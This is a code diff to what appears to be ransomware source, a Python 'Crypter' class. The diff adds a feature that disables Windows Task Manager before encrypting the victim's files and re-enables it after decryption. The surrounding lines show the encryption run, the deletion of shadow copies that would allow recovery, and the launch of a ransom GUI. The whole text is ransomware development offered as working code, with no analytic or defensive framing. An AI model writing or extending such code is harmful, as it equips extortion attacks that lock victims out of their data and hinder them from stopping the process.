@@ -22,6 +22,7 @@ import Crypt
 import Base
 import Gui
 from ScheduledTask import ScheduledTask 
+from TaskManager import TaskManager
 
 
 ###################
@@ -47,20 +48,30 @@ class Crypter(Base.Base):
     # FIRST RUN
     # Encrypt!
     if not os.path.isfile(self.encrypted_file_list):
+      # Disable Task Manager
+      if self.__config["disable_task_manager"]:
+          self.task_manager = TaskManager()      
+          self.task_manager.disable()
+      
+      # Find files and initialise keys
       self.Crypt.init_keys()
       file_list = self.find_files()
+
       # Start encryption
       self.encrypt_files(file_list)
+
       # If no files were encrypted. do nothing 
       if not os.path.isfile(self.encrypted_file_list):
           return
+
       # Delete Shadow Copies
       if "delete_shadow_copies" in self.__config:
           self.__delete_shadow_files()
-      # Present GUI
+
+      # Open GUI
       self.start_gui()
-    # ALREADY ENCRYPTED
-    # Present menu
+
+    # ALREADY ENCRYPTED - Open GUI
     elif os.path.isfile(self.encrypted_file_list):
       self.start_gui()
       
@@ -116,11 +127,15 @@ class Crypter(Base.Base):
   def cleanup(self):
     '''
     @summary: Cleanups the system following successful decryption. Removed the list of
-    encrypted files and deletes the Crypter registry key
+    encrypted files and deletes the Crypter registry key. Re-enable TM
     '''
     
     self.delete_encrypted_file_list()
     self.delete_registry_entries()
+    
+    if self.__config["disable_task_manager"]:
+        self.task_manager.enable()
+
 
 
   def delete_registry_entries(self):
